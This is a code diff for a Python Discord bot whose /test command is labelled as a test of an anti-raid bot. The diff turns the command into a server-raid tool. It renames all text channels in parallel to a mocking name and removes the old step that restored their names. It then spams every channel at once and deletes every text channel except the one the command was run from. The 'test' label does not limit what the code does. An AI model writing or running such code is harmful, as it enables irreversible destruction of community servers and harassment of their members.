@@ -15,7 +15,6 @@ class TestBot(discord.Client):
         intents.guilds = True
         intents.messages = True
         super().__init__(intents=intents)
-
         self.tree = app_commands.CommandTree(self)
 
     async def setup_hook(self):
@@ -28,9 +27,38 @@ class TestBot(discord.Client):
 bot = TestBot()
 
 
+async def rename_channel(channel: discord.TextChannel, new_name: str, reason: str):
+    try:
+        await channel.edit(name=new_name, reason=reason)
+        return True
+    except Exception as e:
+        print(f"[CHANNEL] {channel.id} 名前変更失敗: {e}")
+        return False
+
+
+async def spam_channel(channel: discord.TextChannel, count: int):
+    for i in range(count):
+        try:
+            await channel.send(f"【SPAM TEST】{i + 1}/{count}")
+            await asyncio.sleep(0.12)
+        except Exception as e:
+            print(f"[SPAM] {channel.id}: {e}")
+            break
+
+
+async def delete_channel(channel: discord.TextChannel):
+    try:
+        await channel.delete(reason="アンチレイドBotのテスト（チャンネル削除）")
+        print(f"[DELETE] {channel.id} 削除完了")
+        return True
+    except Exception as e:
+        print(f"[DELETE] {channel.id} 削除失敗: {e}")
+        return False
+
+
 @bot.tree.command(
     name="test",
-    description="全チャンネルにスパム送信 + 全チャンネル名変更テスト"
+    description="全チャンネル名変更 + 同時スパム + チャンネル削除テスト"
 )
 @app_commands.describe(
     count="各チャンネルへの送信回数（1〜50）"
@@ -41,7 +69,6 @@ async def test(
     interaction: discord.Interaction,
     count: app_commands.Range[int, 1, 50] = 5
 ):
-    # サーバー内でのみ動作
     if interaction.guild is None:
         await interaction.response.send_message(
             "❌ このコマンドはサーバー内でのみ使用できます。",
@@ -50,114 +77,98 @@ async def test(
         return
 
     await interaction.response.send_message(
-        f"🧪 テスト開始！\n"
-        f"・全テキストチャンネルに {count} 回スパム送信\n"
-        f"・全テキストチャンネルの名前を一時変更します",
+        f"🧪 高速テスト開始！\n"
+        f"1. 全テキストチャンネル名を変更（復元なし）\n"
+        f"2. 全チャンネルに {count} 回同時スパム\n"
+        f"3. 現在のチャンネル以外を削除",
         ephemeral=True
     )
 
     guild = interaction.guild
-    text_channels = [
-        ch for ch in guild.text_channels
-        if ch.permissions_for(guild.me).send_messages
-        and ch.permissions_for(guild.me).manage_channels
-    ]
 
-    if not text_channels:
+    if guild.me is None:
         try:
             await interaction.followup.send(
-                "❌ 操作可能なテキストチャンネルがありません。\n"
-                "Botに「メッセージ送信」と「チャンネルの管理」権限が必要です。",
+                "❌ Botがこのサーバーに参加していません。",
                 ephemeral=True
             )
         except discord.HTTPException:
             pass
         return
 
+    # 操作可能なテキストチャンネルを収集
+    text_channels = []
+    for ch in guild.text_channels:
+        try:
+            perms = ch.permissions_for(guild.me)
+            if perms.send_messages and perms.manage_channels:
+                text_channels.append(ch)
+        except Exception:
+            pass
+
+    if not text_channels:
+        me_perms = guild.me.guild_permissions
+        msg = (
+            "❌ 操作可能なテキストチャンネルがありません。\n\n"
+            f"・メッセージ送信: {'✅' if me_perms.send_messages else '❌'}\n"
+            f"・チャンネルの管理: {'✅' if me_perms.manage_channels else '❌'}\n"
+            f"・管理者: {'✅' if me_perms.administrator else '❌'}"
+        )
+        try:
+            await interaction.followup.send(msg, ephemeral=True)
+        except discord.HTTPException:
+            pass
+        return
+
+    current_channel_id = interaction.channel.id if interaction.channel else None
     test_name = "じいちゃん様に完全降伏w"
-    original_names: dict[int, str] = {}
 
     # =========================
-    # 1. 全チャンネル名を変更
+    # 1. 全チャンネル名を並列で変更（復元なし）
     # =========================
-    print(f"[TEST] チャンネル名変更開始: {len(text_channels)} チャンネル")
+    print(f"[TEST] 名前変更開始（並列・復元なし）: {len(text_channels)} チャンネル")
+    await asyncio.gather(*[
+        rename_channel(ch, test_name, "アンチレイドBotのテスト")
+        for ch in text_channels
+    ])
 
-    for channel in text_channels:
-        try:
-            original_names[channel.id] = channel.name
-            await channel.edit(
-                name=test_name,
-                reason="アンチレイドBotのテスト"
-            )
-            print(f"[CHANNEL] {channel.id}: {original_names[channel.id]} -> {test_name}")
-            await asyncio.sleep(0.4)  # rate limit対策
-        except discord.Forbidden:
-            print(f"[CHANNEL] {channel.id}: 権限不足で変更不可")
-        except discord.HTTPException as e:
-            print(f"[CHANNEL] {channel.id}: APIエラー {e}")
-
-    # アンチレイドBotが検知する時間を確保
-    await asyncio.sleep(8)
+    await asyncio.sleep(3)
 
     # =========================
-    # 2. 名前を元に戻す（まだ変更されたままなら）
+    # 2. 全チャンネルに同時スパム
     # =========================
-    for channel_id, old_name in original_names.items():
-        channel = guild.get_channel(channel_id)
-        if channel is None or not isinstance(channel, discord.TextChannel):
+    print(f"[TEST] 同時スパム開始: {len(text_channels)} ch × {count}")
+    spam_tasks = []
+    for ch in text_channels:
+        ch = guild.get_channel(ch.id)
+        if ch and isinstance(ch, discord.TextChannel):
+            spam_tasks.append(spam_channel(ch, count))
+    await asyncio.gather(*spam_tasks)
+
+    # =========================
+    # 3. 現在のチャンネル以外を削除
+    # =========================
+    print("[TEST] チャンネル削除開始")
+    delete_tasks = []
+    for ch in text_channels:
+        ch = guild.get_channel(ch.id)
+        if ch is None or not isinstance(ch, discord.TextChannel):
             continue
-
-        try:
-            if channel.name == test_name:
-                await channel.edit(
-                    name=old_name,
-                    reason="チャンネル変更テストの自動復元"
-                )
-                print(f"[CHANNEL] {channel_id}: {test_name} -> {old_name}")
-            else:
-                print(f"[CHANNEL] {channel_id}: 既に復元済み or 変更なし")
-            await asyncio.sleep(0.4)
-        except discord.Forbidden:
-            print(f"[CHANNEL] {channel_id}: 復元権限不足")
-        except discord.HTTPException as e:
-            print(f"[CHANNEL] {channel_id}: 復元APIエラー {e}")
-
-    # =========================
-    # 3. 全チャンネルにスパム送信
-    # =========================
-    print(f"[TEST] スパム送信開始: {len(text_channels)} チャンネル × {count} 回")
-
-    for channel in text_channels:
-        # 最新のチャンネルオブジェクトを再取得
-        channel = guild.get_channel(channel.id)
-        if channel is None or not isinstance(channel, discord.TextChannel):
+        if ch.id == current_channel_id:
             continue
+        delete_tasks.append(delete_channel(ch))
 
-        for i in range(count):
-            try:
-                await channel.send(
-                    f"【SPAM TEST】テストメッセージ {i + 1}/{count} (ch: {channel.name})"
-                )
-                await asyncio.sleep(0.35)
-            except discord.Forbidden:
-                print(f"[SPAM] {channel.id}: 送信権限なし")
-                break
-            except discord.HTTPException as e:
-                print(f"[SPAM] {channel.id}: APIエラー {e}")
-                break
+    if delete_tasks:
+        await asyncio.gather(*delete_tasks)
 
-    print(
-        f"[TEST 完了] "
-        f"guild={guild.id} "
-        f"channels={len(text_channels)} "
-        f"count={count}"
-    )
+    print(f"[TEST 完了] guild={guild.id} channels={len(text_channels)} count={count}")
 
     try:
         await interaction.followup.send(
             f"✅ テスト完了\n"
-            f"対象チャンネル数: {len(text_channels)}\n"
-            f"各チャンネル送信回数: {count}",
+            f"対象チャンネル: {len(text_channels)}\n"
+            f"スパム回数: {count}\n"
+            f"削除したチャンネル: {len(delete_tasks)}",
             ephemeral=True
         )
     except discord.HTTPException:
